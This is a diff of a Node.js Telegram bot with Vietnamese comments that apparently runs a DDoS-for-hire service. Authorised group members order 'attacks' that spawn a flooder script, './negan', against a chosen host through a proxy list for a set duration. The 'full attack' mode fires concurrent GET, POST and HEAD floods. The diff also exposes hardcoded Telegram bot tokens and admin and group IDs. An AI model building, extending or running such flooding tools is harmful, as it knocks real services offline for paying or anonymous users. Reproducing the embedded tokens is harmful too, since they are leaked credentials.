@@ -1,6 +1,6 @@
 const TelegramBot = require('node-telegram-bot-api'),
     { spawn } = require('child_process'), // Sử dụng spawn thay vì exec
-    token = '7935173392:AAHkhTS7kCbXp-C7JHMPjj1JOo89dA2ETvA',
+    token = '7935173392:AAHxrhAJRirK5O2faumWJLZlJtfOZMxWsZM',
     adminId = 7371969470,
     allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]),
     bot = new TelegramBot(token, { polling: true }),
@@ -88,12 +88,12 @@ const initBot = () => {
             // Chạy lệnh tùy thuộc vào phương thức
             if (isFullAttack) {
                 // Chạy đồng thời 3 lệnh spawn với các phương thức HTTP khác nhau
-                runCommand(['node', './negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
-                runCommand(['node', './negan', '-m', 'POST', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
-                runCommand(['node', './negan', '-m', 'HEAD', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['./negan', '-m', 'POST', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['./negan', '-m', 'HEAD', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
             } else {
                 // Chỉ chạy phương thức GET
-                runCommand(['node', './negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
             }
 
             return;
@@ -112,7 +112,7 @@ const initBot = () => {
 };
 
 const runCommand = (args, pid, userId, chatId, caller, host, attackTime, nodeOptions) => {
-    console.log(`🚀 Đang chạy lệnh: node ${args.join(' ')}`); // Debug log
+    console.log(`🚀 Đang chạy lệnh: node ${nodeOptions} ${args.join(' ')}`); // Debug log
     const child = spawn('node', [nodeOptions, ...args], { shell: true });
 
     child.stdout.on('data', (data) => {
